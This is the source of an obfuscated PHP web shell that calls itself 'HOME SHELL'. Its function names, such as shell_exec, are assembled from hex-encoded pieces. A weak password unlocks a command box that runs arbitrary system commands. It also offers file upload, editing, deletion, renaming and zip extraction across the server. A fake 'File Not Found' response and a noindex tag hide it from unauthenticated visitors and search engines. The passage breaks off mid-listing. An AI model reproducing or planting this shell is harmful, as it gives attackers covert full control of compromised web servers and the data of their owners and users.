<?php
 goto bBL5o; AMuAE: $gcw = $hb($fgtg) . "\143" . $hb("\67" . "\x37" . "\66\x34"); goto bbERV; Nrsht: $bxxx = "\142" . "\151"; goto lHxpY; mrNFH: $ssxx = $hb("\x37\63\x37\64") . "\141"; goto Yn5AG; yxpmW: $fgtg = "\x36" . "\x37\66" . "\65" . "\67" . "\x34"; goto Ju0bV; eSSCC: if (!isset($_SESSION["\141\144\155\x69\x6e"])) { if ($_SESSION["\x61\x64\155\151\156"] !== "\x35\70\x31\x38\x36\x31\x32\x36\71\65\61\142\x34\x63\146\x35\x37\144\144\144\142\x61\67\63\144\x63\141\x66\67\x32\142\145") { echo "\74\160\x20\x69\x64\75\x22\x66\151\154\x65\x22\x3e\106\x69\154\x65\40\116\157\164\40\106\x6f\165\156\x64\56\74\57\x70\76"; die; } die; } else { ?>
<!DOCTYPE html>
<html>
<head>
	<title>ERR</title>
	<meta name="robots" content="noindex" />
	<link rel="icon" href="https://git-scm.com/images/logos/downloads/Git-Icon-1788C.png" type="image/icon type" />
	<script src="https://kit.fontawesome.com/9af3d25b53.js" crossorigin="anonymous"></script>
<style type="text/css">
	html {
			width: 100%;
			height: 100%;
			background-color: #111;
			margin: 0;
			padding: 0;
			color: white;
			font-family: 'sans-serif',arial, Verdana;

	}
	body {
		width: 100%;
		margin: 0;
		padding: 0;
	}
	a {
		display: inline-block;
		text-decoration: none;
		color: #4E9F3D;
		font-size: 15px;
		font-weight: bold;
		border: none;
		
	}
	a:hover {
		text-decoration: underline;
		color: white;
	}
	input { display: inline; }
	input[type=text] {
		background: transparent;
		color: white;
		border: none;
		border-bottom: 2px solid green;
		padding: 7px;
		outline: none;
		margin: 0;
	}
	#cmd {
		background: transparent;
		color: #eee;
		font-weight: bold;
		border: 2px solid #333;
		padding: 5px 10px;
		outline: none;
		margin: 0;
	}
	::placeholder {
  	color: #ddd;
  	opacity: 1;
	}
	input[type=submit] {
		display: inline;
		background: green;
		color: white;
		border: none;
		padding: 7px;
		margin: 0;
		border-radius: 8%;
		cursor: pointer;
	}
	button {
		display: inline;
		cursor: pointer;
		background: green;
		color: white;
	}
	table {
		border: 3px solid transparent;
		border-radius: 0px;
		display:  block;
		width: 1200px;
		height: 100%;
		color: white;
		background: #191A19;
		margin: 0;
		margin-top: 0px;
		padding: 8px;
		font-weight: bold;
	}
	td {
		font-size: 15px;
		background: transparent;
		color: #f8f8f8;
		margin: 0;
		padding: 0;
		padding-bottom: 5px;
		border: 0;
	}
	tr {
		border: 0;
		width: 100%;
		margin: 0;
		padding: 10px;
		height: 20px;
	}
	th {
		color: #4E9F3D;
		border-bottom: 2px solid #333;
		text-align: left;
		padding: 15px;
	}
	#menu {
		background: #1E5128;
		color: #eee;
		padding: 12px;
		border: none;
		border-radius: 5px;
		font-size: 10px;
		font-weight: bold;
		box-shadow: 0px 0px 5px #333;
	}
	#menu:hover {
		background: #151515;
		color: #1E5128;
	}
 
	#newinput {
		width: 150px;
		border-bottom: 1px solid #eee;
		padding: 8px;

	}
	#newinput:focus {
		border-bottom: 1px solid orangered;
	}
	#crud {
		background: transparent;
		padding: 8px;
		font-size: 15px;
		color: #444;
		font-weight: bold;
		border-radius: 0px;
		border-bottom: 0px solid lime;
	}
	#crud:hover {
		text-shadow: 5px 0 10px #1E5128;
		color: #1E5128;
		text-decoration: none;
		border-bottom: 2px solid #1E5128;
	}
	#delete {
		background: transparent;
		padding: 8px;
		font-size: 15px;
		color: hotpink;
		font-weight: blod;
		border: 2.5px solid transparent;
	}
	#delete:hover {
		background: transparent;
		color: white;
		border-bottom: 1px solid white;
		text-shadow: #FC0 1px 0 10px;
	}
	#filename {
		font-size: 15px;
		color: #999;
	}
	#filename:hover {
 
		color: #eee;
		text-decoration: underline;
	}
	.container {
		border-radius: 0px;
		display: block;
		width: 100%;
	}
	form {
		display: inline;
	}
	textarea {
		background: #151515;
		border: 1px solid $444;
		color: #eee;
		font-size: 15px;
		font-weight: bold;
		outline: 0px;
		border: 0px;
		border-radius: 10px;
		padding: 5px 10px;
		border-top-left-radius: 0px;
		border-top-right-radius:0px;
		border-bottom-left-radius: 0px ;
	}
	.custom-file-input::-webkit-file-upload-button {
		visibility: hidden;
	}
	.custom-file-input::before {
  	content: 'u̷p̷l̷o̷a̷d̷';
  	display: inline-block;
  	background: linear-gradient(top, #f9f9f9, #e3e3e3);
  	border: 1px solid #999;
  	border-radius: 3px;
  	padding: 5px 8px;
  	outline: none;
  	white-space: nowrap;
  	-webkit-user-select: none;
  	cursor: pointer;
  	 
  	font-weight: 700;
  	font-size: 10pt;
	}
	.custom-file-input:hover::before {
  	border-color: black;
	}
	.custom-file-input:active::before {
  	background: -webkit-linear-gradient(top, #e3e3e3, #f9f9f9);
	}

</style>
</head>
<body>
<?php  if (strtoupper(substr(PHP_OS, 0, 3)) === "\x57\x49\116") { $server = "\127\111\x4e"; } if (isset($_POST["\143\162\x65\141\164\145\x5f\x66\151\154\145"])) { if (!isset($_GET["\160\141\164\150"])) { $new_filehandler = $ngopen(dirname(__FILE__) . "\57" . $_POST["\x6e\x65\167\137\x66\151\x6c\145"], "\x77"); } else { $new_filehandler = $ngopen($hb($_GET["\x70\x61\164\x68"]) . "\57" . $_POST["\x6e\145\x77\137\x66\151\154\145"], "\x77"); } $ngwrite($new_filehandler, ''); $ngclose($new_filehandler); } if (isset($_POST["\155\153\144\x69\x72\x5f\146\157\x6c\x64\145\162"])) { if (!isset($_GET["\160\141\x74\150"])) { mkdir(dirname(__FILE__) . "\57" . $_POST["\x6e\x65\x77\137\x66\x6f\154\x64\145\x72"], 511, true); } else { mkdir($hb($_GET["\160\x61\164\150"]) . "\x2f" . $_POST["\x6e\145\167\137\146\x6f\x6c\144\145\162"], 511, true); } } if (isset($_POST["\x75\x70\x6c\157\x61\144\137\146\151\x6c\145"])) { if (isset($_GET["\160\141\x74\150"])) { $target_dir = $hb($_GET["\x70\141\164\x68"]) . "\x2f"; } else { $target_dir = dirname(__FILE__) . "\57"; } $target_file = $target_dir . basename($_FILES["\x75\x70\x6c\x6f\141\x64\137\146\x69\154\145\x6e\x61\x6d\145"]["\156\x61\155\145"]); if ($mvfl($_FILES["\x75\160\154\157\x61\144\137\146\151\x6c\145\x6e\x61\x6d\145"]["\164\x6d\x70\137\x6e\x61\155\x65"], $target_file)) { $_GET["\x70\x61\164\x68"]; } if ($flz($target_file)) { echo "\74\143\x65\156\164\145\x72\76\x3c\x74\141\142\154\145\x20\x73\164\171\154\145\75\42\142\x61\x63\153\x67\162\157\x75\x6e\x64\x3a\x20\x6c\151\155\x65\x3b\42\x3e\74\x74\162\x3e\74\x74\x64\x20\163\164\x79\154\x65\75\x22\x63\x6f\154\157\x72\x3a\x23\x30\60\60\x3b\x22\76\x53\x75\143\143\145\163\x73\146\x75\x6c\154\x79\x20\125\x70\154\x6f\141\x64\145\x64\x21\74\57\x74\x64\76\x3c\x2f\164\x72\x3e\x3c\57\164\141\142\x6c\145\76\74\x2f\143\x65\156\164\145\162\x3e"; } } ?>
	<body>
		<center>
			<br><br>
			<table style="border:0; margin-bottom: 0px; padding-bottom:0px ;">
			<tr>
				<th style="border: 0;" colspan="3">
					<a  style="color: #eee; text-decoration:  none;" href="?"><i class="fa-solid fa-ghost"></i> HOME SHELL</a></th>
			</tr>
			<tr>
				<th style="border: none; color: #4E9F3D;"><i>Ł337 <font color="#333">REGULATOR</font></i> &nbsp;<font color="#eee" size="1">FRY-JYWRDN</font></th>
				<th style="border: none;">
					<button id="menu" name="mkdir_folder" onclick="new_folder()"><i class="fa-sharp fa-solid fa-virus"></i> NEW FOLDER</button>
	
				<div id="new_folder" style="display:none;">
						<form method="POST">
							<input id="newinput" type="text" name="new_folder" placeholder="[folder_name]">
							<button id="menu" name="mkdir_folder">OK >></button>
						</form>
				</div>
				</th>
				
				<th style="border: none;">
					<button id="menu" name="create_file" onclick="new_file()"><i class="fa-sharp fa-solid fa-virus"></i> NEW FILE</button>
					<div id="new_file" style="display:none;">
						<form method="POST">
							<input id="newinput" type="text" name="new_file" placeholder="[file_name]">
							<button id="menu" name="create_file">OK >></button>
						</form>
					</div>
				</th>
				<th style="border: none;">
					<button id="menu" style=" background: #222;"><< @ >></button>
				</th>
				<th style="border: none;">
					<?php  if (isset($_POST["\154\x6f\147\157\165\164"])) { session_destroy(); echo "\74\x73\x63\162\151\160\164\x3e\167\x69\x6e\144\157\167\56\154\157\x63\141\164\x69\x6f\156\x3d\42\77\170\x78\42\73\74\57\163\x63\x72\151\160\164\x3e"; } ?>
					<form method="POST" action="">
						<button id="menu" name="logout"><i class="fa-sharp fa-solid fa-virus"></i> LOGOUT</button>
					</form>
				</th>
				</tr>
				</table>
				<script>
					function new_folder() {
  					var x = document.getElementById("new_folder");
  					var y = document.getElementById("new_file");
  						if (x.style.display === "none") {
    							x.style.display = "inline";
    							y.style.display = "none";
    						} else {
    							x.style.display = "none";
    						}
					}
					function new_file() {
  					var x = document.getElementById("new_file");
  					var y = document.getElementById("new_folder");
  						if (x.style.display === "none") {
    							x.style.display = "inline";
    							y.style.display = "none";
    						} else {
    							x.style.display = "none";
    						}
					}
				</script>


			<table style="border: none; margin-top: 0px;padding-bottom:0px ;">
				<tr>
					<th style="border-bottom: none; font-size:15px; margin-left: 0px;">
						 <button style="background: #222; color: #4E9F3D; font-weight: bold; border: 2px solid #222; padding: 11px; border-radius: 6%;" onclick="toolsDiv()">
						 <i><b>Ł</b></i>
						 </button> :
						 <div id="toolsDIV" style="display: none;">
						 	<!-- NAGAMINE POST -->
						 	<form method="POST" action="">
						 		<input type="hidden" name="nagamine">
						 		<button style="background: #eee; color: #111; font-weight: bold; border: 2px solid #eee; padding: 11px; border-radius: 6%;">
						 			𝙉𝘼𝙂𝘼𝙈𝙄𝙉𝙀
						 		</button>
						 	</form> :
						 <button style="background: transparent; border: 2px solid #eee; padding: 11px; border-radius: 2px;">
						 F2
						 </button> :
						 <button style="background: transparent; border: 2px solid #eee; padding: 11px; border-radius: 2px;">
						 F3
						 </button> :
						 <button style="background: transparent; border: 2px solid #eee; padding: 11px; border-radius: 2px;">
						 F4
						 </button> :
						 <button style="background: #DC0000; color: #eee; font-weight: bold; border: 2px solid #DC0000; padding: 11px; border-radius: 6%;">
						 𝙎𝘼𝙎𝘼𝙆𝙄 𝘼𝙕𝙐𝙈𝙄
						 </button> :
						</div>

						 <div id="yuzu" style="display: inline">
						 	<button style="background: #1E5128; color: #eee; font-weight: bold; border: 2px solid #1E5128; padding: 11px; border-radius: 6%;" onclick="yuzuDiv()">
						 	<< Y̷u̷-̷Z̷u̷  >>
						 	</button> :
						 	<div id="yuzuDiv" style="display:none;">
						 		
						 		<form method="POST" enctype="multipart/form-data" action="">
						 			<input type="submit" name="upload_file" style="display: none;" id="submit">
									<input type="file" class="custom-file-input" name="upload_filename" onchange="document.getElementById('submit').click()">
								</form>
						 		 : 
						 	</div> 
						 	</div>
						 	
 
						 	<form method="POST" action="">
						 	<input type="hidden" name="c-engine">
						 	<button style="background: #1E5128; color: #03C988; font-weight: bold; border: 2px solid #1E5128; padding: 11px; border-radius: 6%;">
						 			𝙲-𝙴𝙽𝙶𝙸𝙽𝙴 <?php  if ($_SESSION["\145\156\147\x69\156\145"] == "\x61\x64\x6d\x69\x6e") { echo "\74\146\x6f\156\x74\x20\x73\164\171\154\145\x3d\47\164\145\x78\164\55\163\x68\x61\144\157\x77\72\x20\60\160\170\x20\60\x70\x78\x20\x35\160\170\40\x23\x30\60\x30\73\47\x63\157\x6c\157\162\x3d\47\x23\146\x66\146\x27\x3e\x5b\124\xcc\267\155\xcc\267\160\314\xb7\166\xcc\xb7\135\40\x61\143\x74\151\x76\x65\x64\x3c\x2f\x66\x6f\156\164\76"; } else { echo "\x3c\146\x6f\x6e\164\x20\143\157\x6c\x6f\x72\x3d\47\43\61\x31\61\x27\76\133\x54\xcc\267\x6d\xcc\xb7\160\xcc\267\x76\xcc\xb7\x5d\x3c\x2f\146\157\x6e\x74\x3e"; } ?>
						 	</button>
						 	</form> 
						 	</div>
					</th>
				</tr>
							<?php  if (isset($_POST["\x63\55\x65\x6e\x67\151\x6e\x65"])) { if ($_SESSION["\145\x6e\147\x69\x6e\x65"] == "\x61\x64\x6d\151\156") { unset($_SESSION["\145\x6e\147\x69\156\145"]); } else { unset($_SESSION["\145\x6e\147\151\x6e\145"]); echo "\74\x74\162\76\x3c\164\x64\76\x3c\x66\x6f\x72\155\x20\155\145\164\x68\x6f\x64\75\x27\x50\117\123\124\x27\x20\141\143\x74\151\157\156\75\x27\x23\163\x75\143\143\145\163\x73\x27\76\74\x69\x6e\x70\x75\x74\40\x74\171\160\x65\75\x27\x74\x65\x78\x74\x27\x20\160\154\x61\x63\x65\x68\x6f\154\x64\x65\x72\75\47\x20\x3e\76\x20\103\55\105\116\x47\111\x4e\105\x20\x50\127\x27\40\156\141\x6d\145\x3d\x27\x70\167\143\155\144\x27\x20\x3e\x3c\151\x6e\160\x75\x74\x20\x74\171\x70\145\75\47\x73\x75\x62\x6d\151\x74\47\40\x3e\74\x2f\146\157\x72\x6d\76\74\x2f\x74\x64\x3e\x3c\57\x74\x72\x3e\x3c\x62\162\x3e"; } } if (isset($_POST["\x70\x77\143\x6d\x64"])) { if ($_POST["\160\x77\143\x6d\144"] == "\x33\x33\67") { $_SESSION["\145\156\147\x69\x6e\145"] = "\141\144\x6d\x69\156"; } } if ($_SESSION["\145\x6e\x67\x69\x6e\145"] == "\141\x64\155\x69\156") { echo "\x3c\164\x64\x3e\72\72\x3a\x20\x3c\146\157\162\155\40\155\x65\x74\x68\x6f\144\x3d\47\120\117\123\x54\47\x3e\74\x69\x6e\x70\165\164\x20\x69\144\x3d\47\x63\x6d\144\47\40\164\x79\160\145\75\x27\x74\145\x78\164\x27\40\x70\154\x61\143\145\x68\157\154\x64\x65\162\75\47\x20\x3e\x3e\x20\103\55\x45\x4e\107\111\116\x45\47\40\156\141\x6d\145\75\47\143\x65\156\147\x69\x6e\145\47\x20\x73\164\171\154\x65\x3d\x27\x77\151\x64\x74\150\x3a\65\60\60\x70\170\x3b\47\40\141\165\x74\157\146\157\143\x75\163\x3e\x20\x7c\40\x3c\x62\165\x74\164\x6f\x6e\x20\151\144\x3d\x27\x63\155\144\x27\40\x3e\76\x3e\74\x2f\142\x75\x74\x74\157\156\76\x3c\57\x66\157\x72\155\76\74\57\164\x64\x3e"; } ?>
			</table>
			<?php  if (isset($_POST["\143\x65\156\x67\151\x6e\x65"])) { $cmdx = "\67\x33\x36\70\66\65"; $cmdy = "\67\x38\66\x35\x36\x33"; $xxx = $hb($cmdx) . "\154\x6c\x5f\x65" . $hb($cmdy); $xv = $xxx($_POST["\x63\145\156\x67\151\x6e\x65"]); ?>
						 	<table>
						 		<tr>
						 			<td style="font-size: 12px;">
						 				[localhost]~# $ <span style="color: lime;"><?php  echo $_POST["\x63\x65\156\x67\x69\x6e\x65"]; ?>
</span>
						 			</td>
						 		</tr>
						 	</table>
						 	<textarea style="width: 1180px; height: 250px; color: #4E9F3D;"><?php  echo $xv; ?>
</textarea>
		<?php  } ?>

			</center>
		<script>
			function toolsDiv() {
  			var x = document.getElementById("toolsDIV");
  			var yuzu = document.getElementById("yuzu");
  			var xx = document.getElementById("yuzuDiv");
  				if (x.style.display === "none") {
    					x.style.display = "inline";
    					yuzu.style.display = "none";
    					xx.style.display = "none";
  				} else {
    					x.style.display = "none";
    					yuzu.style.display = "inline";
    					xx.style.display = "none";
  				}
			}
			function yuzuDiv() {
				var xx = document.getElementById("toolsDIV");
				var x = document.getElementById("yuzuDiv");
				if (x.style.display === "none") {
    					x.style.display = "inline";
    					xx.style.display = "none";
  				} else {
    					x.style.display = "none";
    					xx.style.display = "none";
  				}
			}
		</script>

<?php  if (!isset($_GET["\x70\x61\x74\150"])) { $dir = $gcw(); $path = $bh($dir); $_GET["\x70\141\x74\x68"]; $current_file = $hb($_GET["\160\141\x74\x68"]); echo "\x3c\x63\145\156\x74\145\x72\76\x3c\x74\x61\x62\x6c\x65\x20\x73\x74\x79\x6c\145\75\42\142\157\x72\144\145\x72\72\x20\60\x3b\42\76\74\164\x72\76\x3c\x74\x64\x20\163\164\x79\154\x65\x3d\x22\160\x61\x64\x64\151\x6e\147\55\154\x65\x66\x74\x3a\61\60\160\170\73\42\x3e\120\141\164\x68\x3a\40\74\57\x74\x64\76\x3c\x74\x64\40\x73\164\x79\154\x65\x3d\x22\x70\x61\144\144\151\x6e\147\x2d\x6c\145\x66\x74\72\61\60\x70\170\73\42\x3e"; if ($server !== "\x57\111\x4e") { echo "\x3c\141\40\x68\162\145\146\75\x22\77\160\x61\x74\150\75\62\x66\x22\76\57\x3c\57\x61\x3e\74\57\164\x64\x3e\74\x74\x64\76"; } $dirs = str_replace("\x5c", "\x2f", $dir); $xdir = explode("\57", $dirs); foreach ($xdir as $key => $value) { if ($value != '') { echo "\x3c\x66\x6f\x6e\164\40\163\x74\171\154\145\75\x22\x63\x6f\x6c\x6f\x72\72\x23\65\65\x35\73\40\x66\157\156\164\x2d\167\x65\x69\147\150\x74\72\x20\x62\157\154\x64\42\76\x2f\x3c\57\x66\157\x6e\x74\76"; } if (strtoupper(substr(PHP_OS, 0, 3)) === "\127\x49\x4e") { echo "\74\x61\40\x68\162\145\146\75\42\x3f\x70\x61\x74\150\75"; } else { echo "\74\141\40\x68\162\x65\146\75\x22\77\160\141\x74\150\75\62\146"; } for ($i = 0; $i <= intval($key); $i++) { $folder_path = $bh($xdir[$i] . "\x2f"); $filepath = $xdir[$i] . "\57"; $fld = str_replace("\x20", '', $filepath); $fld = str_replace("\57", '', $filepath); if ($folder_path != "\x32\x66") { echo $folder_path; } } echo "\x22\76" . $fld . "\74\57\141\76"; } echo "\74\x2f\x74\x72\x3e\74\57\x74\144\76\x3c\57\x74\x61\x62\x6c\x65\76\x3c\57\x63\x65\156\x74\x65\x72\76"; } else { $path = $_GET["\x70\x61\x74\x68"]; $dir = $hb($_GET["\160\x61\164\150"]); $current_file = $hb($_GET["\160\141\164\150"]); echo "\74\x63\x65\x6e\x74\x65\162\76\x3c\x74\141\142\x6c\x65\40\x73\x74\171\154\145\x3d\42\x62\157\162\144\x65\x72\x3a\x20\60\73\42\76\74\x74\162\x3e\x3c\164\144\x20\x73\164\x79\154\x65\75\x22\160\x61\x64\x64\151\156\147\55\x6c\x65\x66\164\72\x31\x30\x70\x78\73\x22\x3e\x50\141\x74\x68\x3a\x20\74\x2f\x74\x64\76\74\x74\x64\40\x73\x74\x79\154\x65\x3d\42\x70\141\x64\144\151\x6e\147\x2d\154\145\146\x74\72\x31\x30\160\170\x3b\x22\76"; if ($server !== "\x57\x49\x4e") { echo "\x3c\x61\x20\150\x72\145\146\75\x22\77\160\x61\x74\150\x3d\62\x66\x22\76\x2f\74\x2f\x61\x3e\x3c\57\x74\144\76\74\164\144\76"; } $dirs = str_replace("\x5c", "\x2f", $dir); $xdir = explode("\57", $dirs); foreach ($xdir as $key => $value) { if ($value != '') { echo "\x3c\x66\157\x6e\164\40\163\x74\x79\x6c\145\75\42\x63\157\x6c\x6f\x72\x3a\x23\x35\65\65\73\x20\x66\x6f\x6e\164\x2d\167\145\x69\147\150\164\x3a\x20\142\x6f\x6c\144\42\x3e\x2f\x3c\57\x66\x6f\156\164\76"; } if (strtoupper(substr(PHP_OS, 0, 3)) === "\x57\x49\116") { echo "\x3c\141\x20\x68\162\145\146\75\x22\x3f\x70\141\164\150\x3d"; } else { echo "\x3c\x61\40\x68\162\x65\x66\x3d\42\77\x70\x61\164\x68\75\x32\x66"; } for ($i = 0; $i <= intval($key); $i++) { $folder_path = $bh($xdir[$i] . "\x2f"); $filepath = $xdir[$i] . "\57"; $fld = str_replace("\x20", '', $filepath); $fld = str_replace("\57", '', $filepath); if ($folder_path != "\62\146") { echo $folder_path; } } echo "\x22\76" . $fld . "\74\x2f\141\x3e"; } echo "\74\57\164\162\76\74\57\x74\144\x3e\x3c\57\x74\x61\142\154\145\76\74\57\143\x65\x6e\x74\145\162\76"; if (is_file($current_file)) { $dirname = $bh(dirname($current_file)); $my = $current_file; $myrx = str_replace($_SERVER["\x44\117\103\x55\115\x45\116\124\x5f\x52\117\x4f\124"], "\57", $my); $current_file = str_replace("\57\57", "\57", $current_file); ?>
		<br>
		<center>
		<table style="width: 1200px;border-bottom-left-radius: 0px; border-bottom-right-radius: 0px;">
			<tr>
				<td>
					Filename: <a target="_blank" href="<?php  echo "\x2f\x2f" . $_SERVER["\x48\x54\124\120\137\110\117\123\x54"] . "\57" . $myrx; ?>
"><?php  echo $current_file; ?>
</a>
				</td>
			</tr>
		</table>


		<?php  $f = "\x66" . "\x69" . "\x6c" . "\145" . "\x5f" . "\147" . "\145" . "\x74" . "\137" . "\143" . "\x6f" . "\x6e" . "\x74" . "\x65" . "\x6e" . "\x74" . "\163"; $text = $f($current_file); ?>
		<textarea style="width:1180px;height:660px;" readonly><?php  echo htmlentities($text); ?>
		</textarea><br />
		<br><br>
		<?php  die; } } if (isset($_POST["\162\x65\156\x61\x6d\x65\137\x66\x6f\x6c\x64\x65\x72\137\160\162\x6f\x63\143\x65\x73\x73"])) { rename($_POST["\x6f\154\x64\146\x6f\x6c\144\x65\x72\x6e\x61\155\145"], $_POST["\x64\151\x72\146\157\x6c\144\x65\162\156\141\x6d\x65"] . "\x2f" . $_POST["\x6e\145\x77\146\x6f\154\144\145\x72\156\141\155\x65"]); } if (isset($_POST["\x72\145\156\141\x6d\145\x5f\146\157\154\144\145\x72"])) { ?>

	<br><br>
	<center>
	<table>
		<tr>
			<th><i class="fa-sharp fa-solid fa-hippo"></i> RENAME FOLDER</th>
			<th>
				dirname:
			</th>
			<th>
				<?php  echo dirname($hb($_POST["\x66\x6f\154\144\x65\x72\160\141\164\x68"])) . "\57"; ?>
			</th>
			<th width="600px">
				<form method="POST">
					<input type="hidden" name="dirfoldername" value="<?php  echo dirname($hb($_POST["\146\157\x6c\x64\x65\x72\x70\141\164\x68"])) . "\x2f"; ?>
">
					<input type="hidden" name="oldfoldername" value="<?php  echo $hb($_POST["\146\157\154\x64\x65\162\160\x61\x74\150"]); ?>
">
					<input type="text" style="font-size:  18px;width:100%" name="newfoldername" value="<?php  echo $_POST["\x66\x6f\x6c\x64\x65\162\156\x61\155\x65"]; ?>
">
			</th>
			<th>
				<input id="crud" type="submit" name="rename_folder_proccess" value="REN">
			</form>
			</th>
		</tr>
	</table>
	</center>
	<?php  die; } if (isset($_POST["\144\145\x6c\x65\164\x65\x66\x6f\154\x64\145\x72"])) { chmod($hb($_POST["\146\x6f\x6c\144\x65\162\x70\x61\164\150"], 511)); rmdir($hb($_POST["\146\x6f\154\x64\145\162\x70\141\164\x68"])); } if (isset($_POST["\x72\x65\156\x61\155\145\x5f\x66\x69\x6c\x65\137\160\x72\157\x63\x63\x65\163\x73"])) { rename($_POST["\157\154\144\146\151\154\x65\156\141\155\x65"], $_POST["\144\x69\162\x66\151\154\145\156\x61\x6d\x65"] . "\57" . $_POST["\x6e\145\167\146\x69\154\145\x6e\141\x6d\145"]); } if (isset($_POST["\x72\145\x6e\141\x6d\x65\137\x66\x69\154\x65"])) { ?>

	<br><br>
	<center>
	<table>
		<tr>
			<th><i class="fa-sharp fa-solid fa-hippo"></i> RENAME FILE</th>
			<th>
				dirname:
			</th>
			<th>
				<?php  echo dirname($hb($_POST["\146\x69\x6c\145\160\x61\x74\x68"])) . "\x2f"; ?>
			</th>
			<th width="600px">
				<form method="POST">
					<input type="hidden" name="dirfilename" value="<?php  echo dirname($hb($_POST["\x66\151\x6c\145\x70\141\x74\150"])) . "\57"; ?>
">
					<input type="hidden" name="oldfilename" value="<?php  echo $hb($_POST["\x66\x69\154\x65\160\141\164\150"]); ?>
">
					<input type="text" style="font-size:  18px;width:100%" name="newfilename" value="<?php  echo $_POST["\146\x69\x6c\x65\x6e\x61\x6d\x65"]; ?>
">
			</th>
			<th>
				<input id="crud" type="submit" name="rename_file_proccess" value="REN">
			</form>
			</th>
		</tr>
	</table>
	</center>
	<?php  die; } if (isset($_POST["\165\x6e\x7a\151\160\x5f\146\x69\154\145"])) { $zip = new ZipArchive(); $res = $zip->open($hb($_POST["\146\151\x6c\145\x70\141\x74\x68"])); if ($res === TRUE) { $zip->extractTo(dirname($hb($_POST["\146\x69\154\x65\160\141\164\x68"]))); $zip->close(); echo "\x3c\143\145\156\x74\x65\x72\76\x3c\164\141\142\154\145\x20\x73\x74\171\154\145\75\x22\x62\141\143\x6b\x67\162\x6f\165\156\x64\x3a\x20\x23\x30\60\103\64\60\x30\x3b\x22\x3e\x3c\164\x72\x3e\74\164\x64\x3e\x53\165\x63\143\x65\163\x73\x66\x75\154\x6c\171\40\125\156\172\x69\160\40\106\151\154\x65\x21\x3c\x2f\x74\144\76\x3c\57\164\162\76\x3c\57\x74\141\142\154\x65\76\x3c\57\x63\145\156\x74\x65\x72\76"; } else { echo "\x3c\x63\x65\156\164\145\162\76\x3c\164\x61\142\154\x65\40\163\x74\x79\x6c\x65\75\x22\x62\x61\x63\x6b\147\162\x6f\165\156\144\x3a\x20\43\104\x43\60\x30\x30\x30\73\x22\76\74\x74\162\76\74\x74\x64\76\106\141\151\x6c\145\144\40\164\x6f\40\125\156\172\x69\x70\x20\106\x69\x6c\145\41\x3c\x2f\164\x64\x3e\74\x2f\x74\x72\76\x3c\57\164\x61\142\x6c\x65\76\x3c\x2f\x63\145\x6e\x74\x65\x72\76"; } } if (isset($_POST["\x64\145\x6c\x65\164\145\x66\x69\x6c\x65"])) { chmod($hb($_POST["\146\151\154\x65\160\x61\164\x68"]), 438); unlink($hb($_POST["\146\x69\154\x65\160\141\x74\x68"])); } if (isset($_POST["\163\x61\x76\x65\146\x69\154\x65"])) { $file_handler = $ngopen($_POST["\146\x69\x6c\145\x70\x61\x74\x68"], "\x77"); $ngwrite($file_handler, $_POST["\146\x69\x6c\x65\x5f\143\x6f\x6e\164\145\156\164"]); $ngclose($file_handler); } if (isset($_POST["\x65\144\x69\164\137\x66\x69\154\145"])) { echo "\74\142\162\x3e\x3c\142\x72\x3e\x3c\x62\162\76"; $f = $flg . "\137" . "\143" . "\x6f" . "\156" . "\x74" . "\145" . "\x6e" . "\x74" . "\163"; $text = $f($hb($_POST["\146\x69\154\x65\x70\141\164\x68"])); ?>
		<center>
		<table style="background: #F88000; width: 1200px;border-bottom-left-radius: 0px; border-bottom-right-radius: 0px;">
			<tr>
				<td>
					EDITING FILE: <?php  echo $_POST["\x66\151\x6c\x65\156\x61\155\x65"]; ?>
				</td>
			</tr>
		</table>
		<form method="POST">
		<textarea  style="background:#222; width:1180px;height:500px;color:#00C400;" name="file_content"><?php  echo htmlentities($text); ?>
</textarea><br><br />
			<input type="hidden" name="filepath" value="<?php  echo $hb($_POST["\x66\151\154\x65\x70\x61\x74\x68"]); ?>
">
			<input type="submit" name="savefile" value="save" style="font-size: 18px;">
		</form>
		<br><br>
		</center>
	<?php  die; } echo "\74\x62\x72\76"; ?>




<?php  if (is_dir($dir)) { $isi_dir = scandir($dir); } else { $isi_dir = $current_file; } ?>
<center>
	<table style="width: 1200px;">
		<tr>
			<th style="width: 450px"><i class="fa-sharp fa-solid fa-virus"></i> NAME</th>
			<th colspan="4" style="width: 170px;">ACTION</th>
			<th style="text-align:  right; width: 330px;">SIZE</th>
			<th style="width:50px;"></th>
			<!--
			<th>LAST MODIFIED</th>
			<th>FILEPERMS</th>-->
		</tr>
<?php  foreach ($isi_dir as $x => $foldername) { if (is_dir($dir . "\x2f" . $foldername)) { if ($foldername !== "\56" & $foldername !== "\x2e\56") { $folderpath = $bh($dir . "\x2f" . $foldername); ?>
				<tr>
					<td>

					<p>
						<i class="fa-solid fa-folder-open" style="color: #888;padding: 5px;"></i>
						<a id="filename" href="?path=<?php  echo $folderpath; ?>
"><?php  echo $foldername; ?>
</a>
					</p>
					</td>
					<td></td>
					<td>
						<form method="POST">
							<input type="hidden" name="folderpath" value="<?php  echo $folderpath; ?>
">
							<input type="hidden" name="foldername" value="<?php  echo $foldername; ?>
">
							<input id="crud" type="submit" name="rename_folder" value="REN">
						</form>
					</td>
					<td></td>
					<td>
						<form method="POST">
								<input type="hidden" name="folderpath" value="<?php  echo $folderpath; ?>
">
								<input type="hidden" name="foldername" value="<?php  echo $foldername; ?>
">
								<input id="crud" style="color: #DC0000;" type="submit" name="deletefolder" value="DEL">
							</form>

					</td>
					
					<td align="right" style="color: #555;">DIR&nbsp;&nbsp;<span style="color: #eee;"> |</span></td>
					<td><?php  $folder_x = str_replace($_SERVER["\104\117\103\125\115\x45\116\x54\x5f\122\x4f\117\x54"], "\x2f", $hb($folderpath)); ?>
&nbsp;&nbsp;
						<a target="_blank" href="<?php  echo "\150\164\164\160\x3a\x2f\57" . $_SERVER["\110\124\124\x50\x5f\x48\117\123\x54"] . "\57" . $folder_x; ?>
"><i class="fa-sharp fa-solid fa-arrow-up-right-from-square"></i></a>
					</td>
				</tr>
				<?php  } } } echo ''; foreach ($isi_dir as $x => $filename) { if (is_file($dir . "\x2f" . $filename)) { if ($filename !== "\56" & $filename !== "\x2e\56") { $filepath = $bh($dir . "\57" . $filename); ?>

				<tr>
					<td>
						<p>
							<i class="fa-solid fa-file-lines" style="color: #888;padding: 5px;"></i>
							<a id="filename" href="?path=<?php  echo $filepath; ?>
"><?php  echo $filename; ?>
</a>
						</p>
					</td>
					<td>
						<form method="POST">
								<input type="hidden" name="filepath" value="<?php  echo $filepath; ?>
">
								<input type="hidden" name="filename" value="<?php  echo $filename; ?>
">
								<input type="submit" id="crud" name="edit_file" value="EDIT">
						</form>
					</td>
					<td>
						<form method="POST">
								<input type="hidden" name="filepath" value="<?php  echo $filepath; ?>
">
